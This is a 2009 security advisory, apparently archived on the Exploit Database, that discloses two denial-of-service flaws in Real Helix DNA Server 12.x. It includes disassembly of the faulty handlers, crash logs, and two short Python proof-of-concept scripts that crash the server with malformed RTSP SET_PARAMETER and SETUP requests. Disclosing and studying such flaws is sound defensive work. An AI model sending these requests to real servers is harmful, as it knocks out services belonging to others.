Real Helix DNA RTSP and SETUP request handler vulnerabilities

1. *Advisory Information*

Title: Real Helix DNA RTSP and SETUP request handler vulnerabilities
Advisory ID: CORE-2009-0227
Advisory URL: http://www.coresecurity.com/content/real-helix-dna
Date published: 2009-07-17
Date of last update: 2009-07-17
Vendors contacted: RealNetworks
Release mode: Forced release

2. *Vulnerability Information*

Class: Denial of service (DoS)
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: N/A
CVE Name: CVE-2009-2533, CVE-2009-2534

3. *Vulnerability Description*

Helix Server is a multi-format cross-platform streaming server. Two
vulnerabilities have been found, that could allow a remote attacker to
crash the Helix Server.

During a 'RTSP' (SET_PARAMETERS) request handling, if an empty
'DataConvertBuffer' parameter is received by the server, it will raise
an exception reading an invalid direction of memory. This exception is
usually handled correctly but if you send this malformed request
multiple times in a short period of time, it could render the Helix
Server unresponsive and terminate its execution.

During the 'SETUP' request handling, a 0x2F character is searched in the
request line, if this byte is absent the process crashes with an access
violation.

4. *Vulnerable packages*

   . Helix Server Version 12.x
   . Helix Mobile Server Version 12.x
   . The vulnerabilities were investigated on Helix Server Version
12.0.1.215 (Tahiti) Build 175002/12667

5. *Non-vulnerable packages*

   . Helix Server Version 13.0.0
   . Helix Mobile Server Version 13.0.0

6. *Vendor Information, Solutions and Workarounds*

According to the Security Update 071409HS [2] published by RealNetworks:
"The vulnerability is resolved on the following platforms by installing
Version 13.0.0 of the Helix Server and the Helix Mobile Server. This
only pertains to supported versions of the platforms listed below. The
updated version will be available on your RealNetworks PAM site after
12:00 am PST, on July 14, 2009."

   . Red Hat Enterprise Linux 4
   . Red Hat Enterprise Linux 5
   . Sun Solaris 10
   . Windows 2003

7. *Credits*

These vulnerabilities were discovered and researched by Damian Frizza
from Core Security Technologies.

8. *Technical Description / Proof of Concept Code*

8.1. *RTSP request handling Denial of Service (CVE-2009-2533)*

The problem arises when the 'rmserver' process receives an 'RTSP
(SET_PARAMETER)' request with no content in the 'DataConvertBuffer'
parameter. The handling code reads at the memory location zero (0) and
triggers an exception, which is handled correctly. However sending this
malformed request multiple times renders the rmserver process
unresponsive and subsequently stops its execution.

The code section which triggers the exception is:

/-----------

00458066  |.     C745 08 00000000 MOV DWORD PTR SS:[EBP+8],0
*Sets the content of the local variable to 0
0045806D  |.     8B10             MOV EDX,DWORD PTR DS:[EAX]
0045806F  |.     50               PUSH EAX
00458070  |.     FF52 2C          CALL DWORD PTR DS:[EDX+2C]
00458073  |.     8B45 08          MOV EAX,DWORD PTR SS:[EBP+8]
00458076  |.     8B10             MOV EDX,DWORD PTR DS:[EAX]          *
Tries to read form 0 memory location

- -----------/

 The following PoC code reproduces the issue:

/-----------

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('172.16.132.133',554))

setRequest = "SET_PARAMETER / RTSP/1.0\r\n"
setRequest +="DataConvertBuffer: \r\n\r\n"

for i in range(5):
  print i
  s.send(setRequest)

s.close()

- -----------/

The following output is written in the log file:

/-----------

4068: FATAL ERROR:  The server has run out of memory!
FATAL ERROR:  Last request was rounded up to 1155072 bytes
Trace:
0x00409C96
...
...
...
0x00000000
FATAL ERROR:  Server Terminated

- -----------/

8.2. *Malformed SETUP command handling Denial of Service (CVE-2009-2534)*

The problem arises when the 'SETUP' request is handled and the byte 0x2F
is absent in the request line. While handling this kind of malformed
request the server crashes with an access violation.

The code section which triggers the access violation is:

/-----------

0047A490  |.     6A 2F            PUSH 2F
0047A492  |.     56               PUSH ESI
0047A493  |.     FF15 08425100    CALL DWORD PTR DS:[<&MSVCR71.strchr>]
   ; MSVCR71.strchr

- -----------/

 if only the "/" (0x2F) character is sent, the program tries to copy
from 0 and the access violation exception is raised.

/-----------

0047A490  |.     6A 2F            PUSH 2F
0047A492  |.     56               PUSH ESI
0047A493  |.     FF15 08425100    CALL DWORD PTR DS:[<&MSVCR71.strchr>]
   ; MSVCR71.strchr

- -----------/

 The following code reproduces the issue:

/-----------

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('172.16.132.133',554))

setRequest = "SETUP / RTSP/1.0\r\n\r\n"

s.send(setRequest)
s.close()

- -----------/

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
